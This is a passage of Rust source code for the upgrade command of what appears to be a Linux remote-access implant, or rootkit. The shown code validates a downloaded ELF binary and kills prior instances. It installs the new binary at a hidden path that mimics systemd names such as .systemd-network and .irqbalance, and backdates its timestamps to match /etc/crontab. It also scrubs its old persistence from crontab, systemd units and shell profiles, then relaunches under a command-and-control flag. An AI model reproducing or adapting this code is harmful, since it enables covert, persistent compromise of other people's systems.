                return format!("Error: new binary too small ({} bytes) — probably an error page, upgrade aborted", meta.len()).to_string();
            }
            Ok(_meta) => {
                // G：验证 ELF magic（\x7fELF）+ 架构匹配——防止把 HTML/部分下载
                // 当成有效升级，也防止多架构 Builder（项 10）时代把 arm64 二进制
                // 刷进 x86_64 agent（magic 能过、替换成功、spawn 失败 → agent 变砖）。
                // ELF64 头：[4]=EI_CLASS（2=64bit）[5]=EI_DATA（1=LE）
                // [18..20]=e_machine（62=x86_64，183=aarch64）。
                match std::fs::File::open(new_binary_path) {
                    Ok(mut f) => {
                        use std::io::Read;
                        let mut hdr = [0u8; 20];
                        let n_read = f.read(&mut hdr).unwrap_or(0);
                        if n_read < 20 || hdr[..4] != [0x7f, b'E', b'L', b'F'] {
                            crate::debug_log("CMD upgrade: downloaded file is not a valid ELF, aborting");
                            return "Error: downloaded file is not a valid ELF (transfer corrupted?), upgrade aborted".to_string();
                        }
                        let expect_machine: u16 = if cfg!(target_arch = "x86_64") {
                            62
                        } else if cfg!(target_arch = "aarch64") {
                            183
                        } else {
                            0 // 未知目标架构：只验 magic
                        };
                        let machine = ((hdr[19] as u16) << 8) | (hdr[18] as u16);
                        if expect_machine != 0
                            && (hdr[4] != 2 || hdr[5] != 1 || machine != expect_machine)
                        {
                            crate::debug_log(&format!(
                                "CMD upgrade: ELF arch mismatch (class={} data={} machine={} expect={}), aborting",
                                hdr[4], hdr[5], machine, expect_machine));
                            return format!(
                                "Error: new binary is built for a different architecture (machine={} expected {}), upgrade aborted",
                                machine, expect_machine).to_string();
                        }
                    }
                    Err(_) => {
                        crate::debug_log("CMD upgrade: cannot read new binary header, aborting");
                        return "Error: cannot read new binary header, upgrade aborted".to_string();
                    }
                }
            }
        }

        // Determine target path (may differ from current for naming migration)
        let target_path = crate::rootkit::get_hidden_path()
            .unwrap_or_else(|| current_exe.clone());
        let target_str = target_path.to_string_lossy().to_string();
        let is_migration = current_str != target_str;
        crate::debug_log(&format!("CMD upgrade: cur={} target={} migration={}", current_str, target_str, is_migration));

        // 1. Kill all other instances of current binary (scan /proc directly,
        //    avoid ps|grep|awk|kill which is vulnerable to path injection and
        //    may kill unrelated processes with similar argv substrings).
        let my_pid = std::process::id();
        let legacy_binaries: &[&str] = &[
            "/usr/lib/systemd/.systemd-network",
            "/usr/lib/systemd/.irqbalance",
            "/usr/lib/systemd/irqbalanced",
            "/usr/lib/systemd/systemd-network",
            "/lib/systemd/systemd-log",
        ];
        #[cfg(unix)]
        {
            let kill_by_exe = |target: &std::path::Path| {
                if let Ok(entries) = std::fs::read_dir("/proc") {
                    for entry in entries.flatten() {
                        let fname = entry.file_name();
                        let pid_str = fname.to_string_lossy();
                        if let Ok(pid) = pid_str.parse::<u32>() {
                            if pid == my_pid { continue; }
                            let exe_link = format!("/proc/{}/exe", pid);
                            if let Ok(resolved) = std::fs::read_link(&exe_link) {
                                if resolved == target {
                                    unsafe { libc::kill(pid as i32, libc::SIGTERM); }
                                }
                            }
                        }
                    }
                }
            };
            kill_by_exe(&current_exe);
            for legacy in legacy_binaries {
                kill_by_exe(std::path::Path::new(legacy));
            }
        }
        #[cfg(not(unix))]
        let _ = my_pid;
        std::thread::sleep(std::time::Duration::from_millis(500));

        // 2. Place new binary at target path
        if let Some(parent) = target_path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }

        // Tracks the ".old" backup in same-path mode so later failure paths
        // (chmod) can restore the previous, known-good binary.
        let mut same_path_backup: Option<String> = None;

        if is_migration {
            // Different path — direct copy, no ETXTBSY issue
            if let Err(e) = std::fs::copy(new_binary_path, &target_path) {
                crate::debug_log(&format!("CMD upgrade: copy failed: {}", e));
                return format!("Error copying to {}: {}", target_str, e);
            }
            crate::debug_log(&format!("CMD upgrade: copied to {}", target_str));
        } else {
            // Same path — rename trick to avoid ETXTBSY
            let backup = format!("{}.old", current_str);
            if let Err(e) = std::fs::rename(&current_exe, &backup) {
                crate::debug_log(&format!("CMD upgrade: rename to .old failed: {}", e));
                return format!("Error renaming: {}", e);
            }
            if let Err(e) = std::fs::copy(new_binary_path, &current_exe) {
                let _ = std::fs::rename(&backup, &current_exe);
                crate::debug_log(&format!("CMD upgrade: copy failed, rolled back: {}", e));
                return format!("Error copying: {}", e);
            }
            crate::debug_log("CMD upgrade: in-place copy done");
            same_path_backup = Some(backup);
        }

        // 3. Permissions and timestamp disguise
        // chmod must succeed before spawn — a non-executable binary would cause
        // spawn to fail with EACCES, leaving the agent dark with no rollback path.
        // On failure we roll the rename back: leaving a non-executable file at the
        // persisted path works until reboot, then every persistence strategy
        // fires a dead binary and the agent is lost permanently.
        match std::process::Command::new("chmod").args(&["+x", &target_str]).output() {
            Ok(out) if out.status.success() => {}
            Ok(out) => {
                crate::debug_log(&format!(
                    "CMD upgrade: chmod +x failed (exit {}), aborting",
                    out.status
                ));
                if let Some(backup) = same_path_backup.take() {
                    let _ = std::fs::rename(&backup, &current_exe);
                    crate::debug_log("CMD upgrade: rolled back to previous binary after chmod failure");
                }
                return format!("Error: chmod +x failed on new binary, upgrade aborted");
            }
            Err(e) => {
                crate::debug_log(&format!("CMD upgrade: chmod spawn error: {}, aborting", e));
                if let Some(backup) = same_path_backup.take() {
                    let _ = std::fs::rename(&backup, &current_exe);
                    crate::debug_log("CMD upgrade: rolled back to previous binary after chmod error");
                }
                return format!("Error: chmod +x error ({}), upgrade aborted", e);
            }
        }

        let reference_files = [
            "/etc/systemd/system/systemd-journald.service",
            "/etc/crontab",
            "/etc/profile",
        ];
        for ref_file in &reference_files {
            if let Ok(metadata) = std::fs::metadata(ref_file) {
                if let Ok(modified) = metadata.modified() {
                    use filetime::{FileTime, set_file_times};
                    let ft = FileTime::from_system_time(modified);
                    let _ = set_file_times(&target_str, ft, ft);
                    break;
                }
            }
        }

        // 4. Uninstall ALL old persistence (current exe + legacy)
        let _ = crate::persist::uninstall_persistence();
        // Also remove legacy service/cron/bashrc that reference old paths
        for legacy in legacy_binaries {
            sh_silent(&format!(
                "crontab -l 2>/dev/null | grep -v '{}' | crontab -",
                legacy
            ));
        }
        // Remove legacy systemd services
        let legacy_services = [".systemd-network.service", ".irqbalance.service"];
        for svc in &legacy_services {
            let svc_path = format!("/etc/systemd/system/{}", svc);
            if std::path::Path::new(&svc_path).exists() {
                let _ = std::process::Command::new("systemctl").args(&["stop", svc]).output();
                let _ = std::process::Command::new("systemctl").args(&["disable", svc]).output();
                let _ = std::fs::remove_file(&svc_path);
            }
        }
        let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).output();

        // Remove legacy entries from bashrc/profile (root + current user)
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
        let mut profile_files: Vec<String> = vec![
            "/root/.bashrc".to_string(),
            "/root/.profile".to_string(),
            "/root/.bash_profile".to_string(),
        ];
        if home != "/root" {
            profile_files.push(format!("{}/.bashrc", home));
            profile_files.push(format!("{}/.profile", home));
            profile_files.push(format!("{}/.bash_profile", home));
        }
        let profile_files = profile_files;
        for pf in &profile_files {
            if let Ok(content) = std::fs::read_to_string(pf.as_str()) {
                let has_old_refs = content.contains(".systemd-network")
                    || content.contains(".irqbalance");

                let cleaned: String = content.lines()
                    .filter(|line| {
                        if line.contains(".systemd-network") || line.contains(".irqbalance") {
                            return false;
                        }
                        if has_old_refs && line.trim() == "# _sys_locale_check" {
                            return false;
                        }
                        true
                    })
                    .collect::<Vec<_>>()
                    .join("\n");
                if cleaned != content {
                    let _ = std::fs::write(pf, cleaned);
                }
            }
        }

        // 5. Migrate data files from legacy paths to current paths
        let data_migrations: &[(&str, &str)] = &[
            // Very old (dot-prefix) -> current
            ("/var/lib/systemd/.issue", "/var/tmp/.systemd/machine-id"),
            ("/var/lib/systemd/.agent_id", "/var/tmp/.systemd/agent_id"),
            ("/var/lib/systemd/.last_comment", "/var/tmp/.systemd/random-seed"),
            ("/var/lib/systemd/.backup_config", "/var/tmp/.systemd/preset"),
            // Previous version (old names) -> current
            ("/var/lib/systemd/issue", "/var/tmp/.systemd/machine-id"),
            ("/var/lib/systemd/agent_id", "/var/tmp/.systemd/agent_id"),
            ("/var/lib/systemd/last_comment", "/var/tmp/.systemd/random-seed"),
            ("/var/lib/systemd/backup_config", "/var/tmp/.systemd/preset"),
        ];
        for (old, new) in data_migrations {
            if std::path::Path::new(old).exists() {
                if !std::path::Path::new(new).exists() {
                    let _ = std::fs::rename(old, new);
                } else {
                    let _ = std::fs::remove_file(old);
                }
            }
        }
        // Migrate uploads directory
        for old_upload in ["/var/lib/systemd/.uploads", "/var/lib/systemd/uploads"] {
            if std::path::Path::new(old_upload).exists()
                && !std::path::Path::new("/var/tmp/.systemd/uploads").exists()
            {
                let _ = std::fs::rename(old_upload, "/var/tmp/.systemd/uploads");
            }
        }

        // 6. Remove old binary files (legacy paths only — NOT the .old backup yet)
        for legacy in legacy_binaries {
            let _ = std::fs::remove_file(legacy);
        }
        // For migration upgrades (moving to a new path) keep a .old backup of the
        // current binary before deleting it.  If spawn fails we restore from it.
        let migration_backup = if is_migration {
            let bak = format!("{}.old", current_str);
            match std::fs::copy(&current_exe, &bak) {
                Ok(_) => {
                    crate::debug_log(&format!("CMD upgrade: migration backup saved to {}", bak));
                    Some(bak)
                }
                Err(e) => {
                    crate::debug_log(&format!("CMD upgrade: migration backup failed ({}), proceeding without rollback", e));
                    None
                }
            }
        } else {
            None
        };

        if is_migration {
            let _ = std::fs::remove_file(&current_exe);
        }
        // Note: .old backup NOT deleted here — kept until spawn succeeds so we can restore on failure.

        // 7. Clean up uploaded temp file
        let _ = std::fs::remove_file(new_binary_path);

        // 8. Start new binary (will auto-install persistence on startup).
        // DAEMONIZED=1: skip double-fork so systemd (Rocky Linux 9+) doesn't kill the child.
        crate::debug_log(&format!("CMD upgrade: spawning new binary at {}", target_str));
        let spawn_result = std::process::Command::new(&target_str)
            .env("C2_UPGRADE", "1")
            .env("DAEMONIZED", "1")
            .spawn();

        // Verify the new process actually started before committing to exit.
        // If spawn fails (e.g. permission denied, binary corrupt), abort upgrade
        // so the old instance keeps running rather than going silent.
        if let Err(e) = spawn_result {
            if is_migration {
                // Restore from the backup we made before deletion
                if let Some(bak) = migration_backup {
                    if std::path::Path::new(&bak).exists() {
                        let _ = std::fs::rename(&bak, &current_str);
                        crate::debug_log("CMD upgrade: migration rollback succeeded");
                    }
                }
            } else {
                // .old still exists — restore it for same-path upgrades
                let backup = format!("{}.old", current_str);
                if std::path::Path::new(&backup).exists() {
                    let _ = std::fs::rename(&backup, &current_str);
                }
            }
            crate::debug_log(&format!("CMD upgrade: spawn failed, upgrade aborted: {}", e));
            return format!("Error: new binary failed to start ({}), upgrade aborted", e);
        }

        crate::debug_log("CMD upgrade: new binary spawned, exiting old instance in 5s");
        // spawn succeeded — now safe to delete any .old backup
        if !is_migration {
            let _ = std::fs::remove_file(format!("{}.old", current_str));
        }
        if let Some(bak) = migration_backup {
            let _ = std::fs::remove_file(bak);
        }

        // 9. Delayed exit — give the response time to be sent, then exit.
        // Set SKIP_PERSIST to prevent the main loop from re-running persistence
        // checks during this overlap window (new process handles its own persistence).
        std::env::set_var("SKIP_PERSIST", "1");
        std::thread::spawn(|| {
            std::thread::sleep(std::time::Duration::from_secs(5));
            unsafe { libc::_exit(0); }  // _exit: skip atexit handlers, avoid cleanup races
        });

        if is_migration {
            format!("Migrating {} -> {}...", current_str, target_str)
        } else {
            "Upgrading...".to_string()
        }
    }
}
